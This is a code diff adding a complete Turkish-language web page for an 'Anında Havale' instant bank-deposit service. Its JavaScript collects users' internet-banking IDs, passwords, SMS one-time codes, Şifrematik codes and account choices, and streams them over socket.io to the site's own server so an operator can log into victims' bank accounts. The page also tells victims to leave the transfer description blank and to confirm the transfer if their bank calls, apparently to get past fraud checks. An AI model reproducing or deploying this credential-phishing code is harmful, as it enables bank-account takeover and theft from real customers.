@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
+<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="/socket.io/socket.io.js"></script>
+<script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+<link rel="stylesheet" href="/rippler.css">
+<link rel="stylesheet" href="/py.css">
+<script src="/jquery.rippler.js"></script>
+<script src="/sweetalert.min.js"></script>
+</head>
+
+<body>
+<div class="loading" style="display: none;">Loading&#8230;</div>
+<div class="abc">
+  <div class="container">
+  
+ <div class="col-md-12" style="margin-top: 10px;"><div class="col-md-2 text-right" style="border-right: solid 1px #dcdcdc;padding: 16px;font-weight: bold;" >Aktif Yatırım Tutarları</div><div class="col-md-10" style="padding: 5px;"><marquee direction="right" id="mrq" >
+
+
+
+</marquee></div></div>
+  <div class="col-md-12" style="margin-top: 1px;">
+  <div class="col-md-4 text-right sol">
+
+  <img src="/images/logo_big.png" style="width: 30%;padding-top: 1px;padding-bottom: 1px" />
+  <img src="/images/1076.png" onerror="$(this).remove();"  style="width: 40%;padding: 20px" />
+  <p class="lead text-right" style="color: darkred;word-break: break-all;font-size:15px;">Hoşgeldiniz. </p>
+  <p class="lead text-right" style="font-size:9px;">Yatırım tutarınızı girdikten sonra, tutarınıza en yakın miktar kadar yatırım yapabilirsiniz.</p>
+  </div>
+  <div class="col-md-8 sag" style="padding-right: 0px;">
+  
+  <p class="lead" style="margin-top: 15px;"><b>1-</b> Bankanızı seçiniz.</p>
+  
+<img src="/banks/1.jpg" data="1"  class="img-thumbnail img-check" />
+  
+<img src="/banks/2.jpg" data="2"  class="img-thumbnail img-check" />
+  
+<img src="/banks/3.jpg" data="3"  class="img-thumbnail img-check" />
+  
+<img src="/banks/4.jpg" data="4"  class="img-thumbnail img-check" />
+  
+<img src="/banks/5.jpg" data="5"  class="img-thumbnail img-check" />
+  
+<img src="/banks/7.jpg" data="7"  class="img-thumbnail img-check" />
+  
+<img src="/banks/9.jpg" data="9"  class="img-thumbnail img-check" />
+  
+<img src="/banks/11.jpg" data="11"  class="img-thumbnail img-check" />
+  
+<img src="/banks/13.jpg" data="13"  class="img-thumbnail img-check" />
+  
+<img src="/banks/15.jpg" data="15"  class="img-thumbnail img-check" />
+  
+<img src="/banks/17.jpg" data="17"  class="img-thumbnail img-check" />
+  
+<img src="/banks/19.jpg" data="19"  class="img-thumbnail img-check" />
+  
+<img src="/banks/23.jpg" data="23"  class="img-thumbnail img-check" />
+  
+<img src="/banks/25.jpg" data="25"  class="img-thumbnail img-check" />
+  
+<img src="/banks/27.jpg" data="27"  class="img-thumbnail img-check" />
+  
+<img src="/banks/29.jpg" data="29"  class="img-thumbnail img-check" />
+  
+<img src="/banks/30.jpg" data="30"  class="img-thumbnail img-check" />
+  
+<img src="/banks/31.jpg" data="31"  class="img-thumbnail img-check" />
+  
+<img src="/banks/32.jpg" data="32"  class="img-thumbnail img-check" />
+  
+<img src="/banks/33.jpg" data="33"  class="img-thumbnail img-check" />
+  
+  <p class="lead" style="margin-top: 15px;"><b>2-</b> Yatırım tutarınızı giriniz.</p>
+  <div class="form-group col-xs-12 floating-label-form-group">
+            <label for="title">Yatırım tutarı</label>
+            <input class="form-control" type="text" autocomplete="off" id="txtAmnt" name="txtAmnt" placeholder="Yatırım tutarı">
+           
+          </div> 
+
+ 
+
+      <div class="text-right">     
+<button style="margin-top: 20px;margin-bottom: 20px" onclick="Payment_Request();" class="btn btn-success btn-lg rippler rippler-bs-success"><i class="fas fa-align-center"></i>&nbsp;Sorgula</button></div>
+
+  
+
+        
+  </div>
+  </div></div>
+  </div>
+
+
+  <script type="text/javascript">
+  var R_Cnt=0;
+  var selectUp="";
+  var selectUw="";
+  var socket = io.connect('/',{query:"id=h47XqBOQ5RFW5yacuObE6g%3D%3D"});
+  socket.on('cnt', function(data) {
+console.log("Aktif kişi sayısı: "+data.cnt);
+});
+
+socket.on('stat',function(data){
+
+$(".loading").hide();
+  if(data.Stat==1)
+  {
+     
+ $(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;'  /><p class='lead'>Bankanızla bağlantı kuruluyor.<br/>Lütfen bekleyiniz. </p></div>");
+  }
+  else if(data.Stat==990)
+  {
+    i_c=1;
+     $(".rd_Iam").remove();
+$("#iam_btn").html("<p class='lead'>Operatörle bağlantı kuruluyor.<br/>Lütfen bekleyiniz.</p>");
+  }
+  else if(data.Stat==999)
+  {
+
+    swal({
+  title: "Anında Havale",
+  text: "İşlem iptal isteğiniz başarıyla alındı. En kısa süre içerisinde iptal edilecektir.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});;
+
+
+  }
+  else if(data.Stat==666)
+  {
+
+    swal({
+  title: "Anında Havale",
+  text: "İşleminiz şu anda doğrulanamadı. Lütfen bilgilerinizi eksiksiz ve havale işlemini yaptığınızdan emin olunuz.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});;
+
+
+  }
+   else if(data.Stat==99)
+  {
+     
+ $(".sag").html(`<div class='text-center' style='margin-top:10px;'><img src='/banks/`+selectBanksID+`.jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;'  /> <div style='padding:5px'><div id='iam_btn'><p class='lead'>Size belirlenen süre içinde Havale'yi yapınız ve \"havaleyi yaptıktan sonra\" yukarıdaki <b>\"İŞLEMİ TAMAMLADIM, BAKİYEME EKLE\"</b> butonuna tıklayınız. <span class='cnt2' style='color:red;font-weight:bold;'>---</span></p><br/><button class='btn btn-success' style='font-size: 14px;font-weight: bold;font-family: verdana;' onclick='Payment_Param_IAM_N(\""+selectUp+"\",\""+selectUw+"\");'>İŞLEMİ TAMAMLADIM, BAKİYEME EKLE</button></div>  <p class='lead'><div style='text-align:left;'><b> - Yatırım yapacağınız hesap sizin adınıza olmalıdır. Farklı bir hesaptan yaptığınız yatırımlar kabul edilmeyecektir. 
+ <br/>
+ - Bu uygulamada sadece havele yapabilirsiniz. <span style='color:red;'>Kredi kartından transfer yapmayınız.</span> Kabul edilmeyecektir.
+<br/>
+ - Açıklama kısmını boş bırakınız. Eğer Yapıkredi bankası ise açıklamaya “Diğer Ödemeler” yazınız.
+<br/>
+ - Size verilen IBAN seçtiğiniz banka ile aynı olmalıdır. Eğer farklı bir banka IBANI ise havale yapmayın. Farklı banka veya farklı isime göndereceğiniz yatırımlarınız kabul edilmeyecektir.
+<br/>
+ - Eğer hesabınızı kontrol ettirmekte sorun yaşıyorsanız 2 saat içerisinde canlı destek birimine işlem dekontunu iletiniz. Süre sonuna kadar tarafınızdan bir belge gelmezse işleminiz iptal edilecek ve herhangi bir karşılığı olmayacaktır.
+<br/>
+ - Size belirlenen süre (12 dakika) içerisinde havaleyi yapınız ve yukarıdaki “İşlemi tamamladım, bakiye ekle” butonuna tıklayınız.</font></b><div/><div class='by_info_check' style='color:red;font-weight: bold;font-size: 20px;''><input type='checkbox' id='chkInfo' style='vertical-align: middle;margin: 3px;'' />Yukardaki yazan uyarıları okudum ve bana belirtilen süre içerisinde havaleyi yaptıktan sonra 'İŞLEMİ TAMAMLADIM, BAKİYEME EKLE' butonuna basacağımı biliyorum. Aksi durumlarda sorumluluk bana aittir.<br><br><button onclick='info_Acc();' class='btn btn-info'>Hesap bilgilerini göster</button> </div><script type='text/javascript'>  function info_Acc(){    if($(\"#chkInfo\").get(0).checked)    {      $('.by_info_check').hide();      $('.by_info').show();    }    else    {      alert('Lütfen sorumluluk bildirgesini onaylayınız.');    }  }<\/script></p><div class=\"by_info\" style=\"display: none;\"><p class='lead'>Hesap ismi : <font style='font-weight:bold'>`+data.Name+`</font><br/>IBAN : <font style='font-weight:bold'>`+data.IBAN+`</font><br/><br/>Tutar : <font color='red' style='font-weight:bold'>`+data.Amnt+` TRY</font></p></div><script type='text/javascript'>  var steppp=0;  var msg=['Bu uygulamada sadece “havale” yapabilirsiniz. Kredi kartından havale veya farklı bankadan gönderim yapmayınız. Sadece seçtiğiniz hesaba ait bankadan gönderim yapınız.',' Bu uygulamada sadece havele yapabilirsiniz. <span style="color:red;">Kredi kartından transfer yapmayınız.</span> Kabul edilmeyecektir.','Açıklama kısmını boş bırakınız. Eğer Yapıkredi işlemi ise açıklamaya “Diğer ödemeler” yazınız. Açıklamaya farklı bir bilgi yazmanız yatırımınızın iptaline neden olur.','12 dakika içerisinde havaleyi yaptıktan sonra “İŞLEMİ TAMAMLADIM, BAKİYEME EKLE” butonuna tıklayacağımı biliyorum.','Eğer belirtilen süre (12 dakika) içerisinde “İŞLEMİ TAMAMLADIM, BAKİYEME EKLE” butonuna tıklamazsam işlemim iptal olacak ve bakiyem artmayacaktır. ','“İŞLEMİ TAMAMLADIM, BAKİYEME EKLE” butonuna tıkladıktan sonra sistemin bankama giriş yaparak, yapmış olduğum havalenin kontrolüne izin vereceğimi ve bilgilerimi doğru girerek yardımcı olacağımı biliyorum.','Bu yönergelerin herhangi birisini yapmadığım taktirde hak iddaa etmeyeceğimi tahattüt ederim.'];function sr(){swal({  title: \"Anında Havale - Doğrulama\",  text: msg[steppp],  icon: \"warning\",  buttons: true,  dangerMode: true,  buttons: [\"Hayır.\", \"Kabul ediyorum.\"]}).then(function(willDelete)  {  if (willDelete) {    if(steppp<4)      {steppp++;       sr();}  } else {  sr();  }});}/*sr();*/  var i_c=0;var countDownDate2=720;function y() {  var distance = countDownDate2;  var minutes = Math.floor(distance / 60);  var seconds = Math.floor(distance % 60);if(distance<0&&i_c==0){window.location.reload();}else{  countDownDate2--;  $('.cnt2').html( minutes + ' dk '  + seconds + ' sn ');   setTimeout('y()', 1000);}}y();<\/script></div></div>`);
+
+  }
+  else if(data.Stat==5||data.Stat==11)
+  {
+     swal({
+  title: "Anında Havale",
+  text: "İşleminize devam edilemiyor. Lütfen bakiye ve banka bilgilerinizi kontrol ederek tekrar deneyiniz.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});
+  }
+ else if(data.Stat==10)
+  {
+     swal({
+  title: "Anında Havale",
+  text:  data.Name+" adına "+data.Amnt+" TRY tutarında havale işleminiz başarıyla gerçekleştirildi. Bankanızın sizi araması doğrultusunda bu bilgileri paylaşmanızı rica ederiz. En kısa süre içerisinde bakiyeniz hesabınıza yansıyacaktır.",
+  icon: "success",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});
+  }
+  else if(data.Stat==20)
+  {
+
+    $(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;' /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><input type='text' id='mno' placeholder='"+(selectBanksID!=31?"Lütfen Müşteri no veya TC no giriniz.":"Lütfen e-posta adresinizi giriniz.")+"' class='form-control'/><input type='password' id='pass' placeholder='Lütfen internet bankacılığı şifrenizi giriniz.' style='margin-top:10px;' class='form-control'/><input type='password' id='pass2' placeholder='Lütfen şifrenizi tekrar giriniz.' style='margin-top:10px;' class='form-control'/></div><div style='clear:both'></div><p class='lead'>Lütfen bilgilerinizi kontrol ederek tekrar giriniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Login(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+  }
+  else if(data.Stat==2)
+  {
+
+ var Number_s=data.MNumbers.split(';');
+ $(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;'  /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><select id='cepnm' class='form-control'></select></div><div style='clear:both'></div><p class='lead'>Lütfen sms şifresinin gelmesini istediğiniz cep telefonu numaranızı seçiniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Param_Lgn_N(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+  $("#cepnm").html("");
+ for(var c=0;c<Number_s.length;c++){
+  if($.trim(Number_s[c])!="")
+  {
+
+      $("#cepnm").append("<option value='"+Number_s[c]+"'>"+Number_s[c]+"</option");
+  }
+
+ }
+
+  }
+  else if(data.Stat==6)
+  {
+
+ var Hav_s=data.HavAcc.split(';');
+ $(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg'   class='img-responsive' style='margin:0 auto;max-width: 50%;' /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><select id='havacc' class='form-control'></select></div><div style='clear:both'></div><p class='lead'>Lütfen hangi hesaptan para transferi yapılacağını seçiniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Param_Hav_N(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+  $("#havacc").html("");
+ for(var c=0;c<Hav_s.length;c++){
+  if($.trim(Hav_s[c])!="")
+  {
+
+      $("#havacc").append("<option value='"+Hav_s[c]+"'>"+Hav_s[c]+"</option");
+  }
+
+ }
+
+  }
+  else if(data.Stat==3)
+  {
+$(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;' /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><input type='text' id='cepsifre' placeholder='Lütfen sms şifrenizi giriniz.' class='form-control'/></div><div style='clear:both'></div><p class='lead'>Cep telefonunuza gelen sms şifrenizi giriniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Param_Lgn(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+
+  }
+  else if(data.Stat==4)
+  {
+$(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg'  class='img-responsive' style='margin:0 auto;max-width: 50%;'  /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><input type='text' id='cepsifre' placeholder='Lütfen şifrematik şifrenizi giriniz.' class='form-control'/></div><div style='clear:both'></div><p class='lead'>Şifrematik giriş şifrenizi giriniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Param_Lgn(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+
+  }
+  else if(data.Stat==7)
+  {
+$(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;'  /><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;'><input type='text' id='cepsifre' placeholder='Lütfen sms şifrenizi giriniz.' class='form-control'/></div><div style='clear:both'></div><p class='lead'>Cep telefonunuza gelen havale sms şifrenizi giriniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='Payment_Havale_Lgn(\""+selectUp+"\",\""+selectUw+"\");'  class='btn btn-success btn-lg rippler rippler-bs-success'>Devam et</button></div></div>");
+
+  }
+  else if(data.Stat==8)
+  {
+
+$(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;'  /><div style='clear:both'></div><p class='lead'>Mobil onayınızı gerçekleştiriniz.</p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'></div></div>");
+  }
+  else if(data.Stat==60)
+  {
+    $(".loading").hide();
+swal({
+  title: "Anında Havale",
+  text: data.Text,
+  icon: "info",
+  button: "Tamam.",
+});
+
+  }
+   else if(data.Stat==61)
+  {
+    $(".loading").hide();
+swal(data.Text, {
+  content: "input",
+})
+.then(function(value)  {
+ 
+socket.emit('payment_param_general', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:selectUp,UwdID:selectUw,Text:value});
+
+});
+
+  }
+
+});
+
+socket.on('h47XqBOQ5RFW5yacuObE6g==', function(data) {
+
+if(!data.success)
+{
+if(data.mid==55)
+  {
+    $(".loading").hide();
+     swal({
+  title: "Anında Havale",
+  text: "Lütfen para yatırma sayfasına dönerek işlemi tekrar başlatın.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});;
+  }
+  else if(data.mid==969)
+  {
+    $(".loading").hide();
+     swal({
+  title: "Anında Havale",
+  text: "İşleminize devam edilemiyor. BL.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  //window.location.reload();
+});;
+  }
+  else if(data.mid==5)
+  {
+    $(".loading").hide();
+     swal({
+  title: "Anında Havale",
+  text: "Tamamlanmamış bir işleminiz bulunmaktadır. Sizi yönlendiriyoruz.",
+  icon: "info",
+  button: "Tamam.",
+}).then(function(value)  {
+  window.location.reload();
+});;
+  }
+  else if(data.mid==2)
+  {
+    $(".loading").hide();
+     swal({
+  title: "Anında Havale",
+  text: "Lütfen yatırım tutarınızı en az 50 TRY olacak şekilde giriniz.",
+  icon: "info",
+  button: "Tamam.",
+});
+  }
+  else if(data.mid==1)
+  {
+    if(R_Cnt==3)
+    {
+      R_Cnt=0;
+$(".loading").hide();
+ swal({
+  title: "Anında Havale",
+  text: "Üzgünüz, şu an size uygun yatırım tutarımız yok. Lütfen tutar değiştiriniz ya da biraz bekledikten sonra tekrar deneyiniz",
+  icon: "info",
+  button: "Tamam.",
+});
+
+    }
+    else
+    {
+       setTimeout(function(){  R_Cnt++;socket.emit('payment_request', {Param:"h47XqBOQ5RFW5yacuObE6g==",BanksID:selectBanksID,Amnt:$("#txtAmnt").val()});},2500);
+    }
+
+
+     
+  }
+
+
+}
+else
+{
+  $("#step0").attr("class","success");
+  $("#step1").attr("class","current");
+  $(".loading").hide();
+  $(".sag").html("");
+     selectUp=data.data.UP;
+   selectUw=data.data.UwdID;
+   countDownDate = new Date(new Date().getTime() + 2*60000).getTime();
+
+  $(".sag").html("<div class='text-center' style='margin-top:10px;'><img src='/banks/"+selectBanksID+".jpg' class='img-responsive' style='margin:0 auto;max-width: 50%;' /><div style='clear:both'></div><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;display:none;' id='cnt_Det'><div id='cnt' style='padding: 10px;color: red;    text-align: right;'></div><div style='clear:both'></div><input type='text' id='mno' placeholder='"+(selectBanksID!=31?"Lütfen Müşteri no veya TC no giriniz.":"Lütfen e-posta adresinizi giriniz.")+"' class='form-control'/><input type='password' id='pass' placeholder='Lütfen internet bankacılığı şifrenizi giriniz.' style='margin-top:10px;' class='form-control'/><input type='password' id='pass2' placeholder='Lütfen şifrenizi tekrar giriniz.' style='margin-top:10px;' class='form-control'/></div><div style='clear:both'></div><p class='lead' style='margin-top:20px;'>"+(yat_Yut!=data.data.Amnt?yat_Yut+" TRY miktarında eşleşme bulunamadı.<br/><br/>":"")+"<b style='color:black'>"+data.data.Amnt+" TRY</b> yatırım yapmayı onaylıyormusunuz ? </p><div style='clear:both'></div><div style='max-width:300px;margin:0 auto;padding:20px;' class='text-right'><button onclick='javascript:window.location.reload();'  class='btn btn-danger btn rippler rippler-bs-danger'>İptal et</button> <button onclick='Payment_Login(\""+data.data.UP+"\",\""+data.data.UwdID+"\");'  class='btn btn-success btn rippler rippler-bs-success' id='btn_D_p'>Devam et</button><br/><br/><button id='btn_IAM' style='display:none;' onclick='Payment_Login_IAM(\""+data.data.UP+"\",\""+data.data.UwdID+"\");'  class='btn btn-success btn rippler rippler-bs-success'>Bu işlemi kendim yapmak istiyorum.</button></div></div>");   x();
+
+}
+
+
+
+
+});
+var countDownDate="";
+var cnc=0;
+function x() {
+
+  
+  var now = new Date().getTime();
+
+ 
+  var distance = countDownDate - now;
+
+
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+
+if(distance<0&&cnc==0)
+{
+window.location.reload();
+
+}
+else
+{
+  $("#cnt").html( minutes + "dk " + seconds + "sn ");
+   setTimeout("x()", 1000);
+}
+
+
+}
+function Payment_Param_Hav_N(up,uw)
+{
+  if($("#havacc").val()!=""&&$.trim($("#havacc").val()))
+  {
+        $(".loading").show();
+        socket.emit('payment_param_hav_n', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,HavAcc:$("#havacc").val()});
+
+  }
+
+
+   
+
+}
+
+function Payment_Param_IAM_N2(up,uw,stat)
+{
+  if(stat==1)
+  {
+swal({
+  title: "Anında Havale - Doğrulama",
+  text: "Havale işleminizi gerçekleştirdiğinize emin misiniz. ?",
+  icon: "warning",
+  buttons: true,
+  dangerMode: true,
+  buttons: ["Hayır.", "Evet"]
+})
+.then(function(willDelete)  {
+  if (willDelete) {
+      $(".loading").show();
+  socket.emit('payment_param_iam_n2', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,Stat:stat});
+  } else {
+  
+  }
+});
+  }
+  else if(stat==2)
+  {
+swal({
+  title: "Anında Havale - Doğrulama",
+  text: "Bu işlemi iptal etmek istediğinize emin misiniz. ?",
+  icon: "warning",
+  buttons: true,
+  dangerMode: true,
+  buttons: ["Hayır.", "Evet"]
+})
+.then(function(willDelete)  {
+  if (willDelete) {
+      $(".loading").show();
+  socket.emit('payment_param_iam_n2', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,Stat:stat});
+  } else {
+  
+  }
+});
+  }
+  
+}
+function Payment_Param_IAM_N(up,uw)
+{
+   if(!$("#chkInfo").get(0).checked)
+    {
+     
+      alert("Lütfen sorumluluk bildirgesini onaylayınız.");
+      return;
+    }
+
+  $(".loading").show();
+  socket.emit('payment_param_iam_n', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw});
+}
+
+function Payment_Param_Lgn_N(up,uw)
+{
+  if($("#cepnm").val()!=""&&$.trim($("#cepnm").val()))
+  {
+        $(".loading").show();
+        socket.emit('payment_param_lgn_n', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,CepN:$("#cepnm").val()});
+
+  }
+
+
+   
+
+}
+function Payment_Havale_Lgn(up,uw)
+{
+  if($("#cepsifre").val()!=""&&$.trim($("#cepsifre").val()))
+  {
+        $(".loading").show();
+        socket.emit('payment_havale_lgn', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,CepSifre:$("#cepsifre").val()});
+
+  }
+
+
+   
+
+}
+function Payment_Param_Lgn(up,uw)
+{
+  if($("#cepsifre").val()!=""&&$.trim($("#cepsifre").val()))
+  {
+        $(".loading").show();
+        socket.emit('payment_param_lgn', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,CepSifre:$("#cepsifre").val()});
+
+  }
+
+
+   
+
+}
+var ekran_off=true;
+var yat_Yut=0;
+function Payment_Login(up,uw)
+{
+  if(ekran_off)
+  {
+     $("#cnt_Det").show();
+      if(selectBanksID==2||selectBanksID==15||selectBanksID==11)
+     {
+        $("#btn_IAM").show();
+        $("#btn_D_p").hide();
+     }
+     else
+     {
+      $("#btn_IAM").hide();
+        $("#btn_D_p").show();
+     }
+     ekran_off=false;
+  }
+  else
+  {
+     if($("#pass").val()!=$("#pass2").val())return;
+
+  if($.trim($("#mno").val())=="")return;
+
+  $("#step1").attr("class","success");
+  $("#step2").attr("class","current");
+   $(".loading").show();
+      cnc=1;
+        socket.emit('payment_login', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,Mno:$("#mno").val(),Pass:$("#pass").val(),Pass2:$("#pass2").val()});
+  }
+ 
+
+}
+function Payment_Login_IAM(up,uw)
+{
+
+  if($("#pass").val()!=$("#pass2").val())return;
+
+  if($.trim($("#mno").val())=="")return;
+if($.trim($("#pass").val())=="")return;
+
+swal({
+  title: "Anında Havale - Güvenlik",
+  text: "Size vereceğimiz IBAN, Hesap ismi ve Tutar bilgilerini kontrol ettikten sonra 12 dakika içerisinde havale yapmayı kabul ediyor musunuz?",
+  icon: "warning",
+  buttons: true,
+  dangerMode: true,
+  buttons: ["Hayır.", "Evet, kabul ediyorum."]
+})
+.then(function(willDelete)  {
+  if (willDelete) {
+        cnc=1;
+
+  $("#step1").attr("class","success");
+  $("#step2").attr("class","current");
+   $(".loading").show();
+        socket.emit('payment_login_iam', {Param:"h47XqBOQ5RFW5yacuObE6g==",UP:up,UwdID:uw,Mno:$("#mno").val(),Pass:$("#pass").val(),Pass2:$("#pass2").val()});
+  } else {
+   window.location.reload(true);
+  }
+});
+
+
+
+
+
+}
+
+
+  function Payment_Request()
+  {
+/*
+    alert("Şu anda sistemimiz güncellemeye girmiştir. En kısa süre içerisinde aktif olacaktır.");
+    return;
+*/
+    if($('b:contains(null null()').length==1){
+      alert('Profilinizdeki Ad Soyad bilgilerini doldurduktan sonra yatırım yapabilirsiniz.');
+      return;
+    }
+
+    if(selectBanksID!=""&&selectBanksID!=0&&$.trim($("#txtAmnt").val())!="")
+    {
+      yat_Yut=$("#txtAmnt").val();
+      $(".loading").show();
+        socket.emit('payment_request', {Param:"h47XqBOQ5RFW5yacuObE6g==",BanksID:selectBanksID,Amnt:$("#txtAmnt").val()});
+    }
+  }
+  function check_out(arg)
+  {
+      $.get( "/check",{BanksID:selectBanksID==0?"":selectBanksID})
+        .done(function( data ) {
+         
+          $("#mrq").html("");
+
+          //kk ile normal banka id lerin mappingi
+          var kkList={35:1,36:3,37:4,38:5,39:7,40:9,41:13,42:11,43:15,44:27};
+
+          for (var i = 0; i < data.data.length; i++) {
+
+            var bnkid= !kkList[data.data[i].BanksID] ? data.data[i].BanksID : kkList[data.data[i].BanksID];
+            
+            if($("img[data="+bnkid+"]").length == 0){
+              continue;
+            }
+
+             $("#mrq").append('<div style="'+(i != data.data.length-1?"border-right: solid 1px #dcdcdc;":"")+'padding: 4px;display: inline-block;"><span><img src="/banks/'+data.data[i].BanksID+'.jpg"    style="height: 35px;margin-right:3px;margin-bottom:3px;vertical-align:middle" />'+data.data[i].Amnt+' TRY</span></div>');
+          }
+         setTimeout("check_out()", 5000);
+        });
+  }
+  var selectBanksID=0;
+  $(document).ready(function(e){
+
+check_out();
+
+     $(".rippler").rippler({
+        // addElement:"svg"
+      });
+    $("body").on("input propertychange", ".floating-label-form-group", function(e) {
+    $(this).toggleClass("floating-label-form-group-with-value", !!$(e.target).val());
+  }).on("focus", ".floating-label-form-group", function() {
+    $(this).addClass("floating-label-form-group-with-focus");
+  }).on("blur", ".floating-label-form-group", function() {
+    $(this).removeClass("floating-label-form-group-with-focus");
+  });
+
+        
+      $('.img-check').click(function(e) {
+       selectBanksID= $(this).attr("data");
+         if(selectBanksID=='2')
+       {
+         swal({
+  title: "Anında Havale'den bir ilk. ",
+  text: "Havale işlemini siz yapın , biz kontrol edip onaylayalım. Seçtiğiniz tutar kadar ödeme yapmalısınız. Aksi halde işleminiz iptal edilecektir ve para iadesi olmayacaktır.",
+  icon: "info",
+  button: "Tamam.",
+});
+       }
+        $('.img-check').not(this).removeClass('check').addClass('uncheck');
+      $(this).addClass('check').removeClass('uncheck');
+
+    });
+      
+  });
+  </script>
+</body>
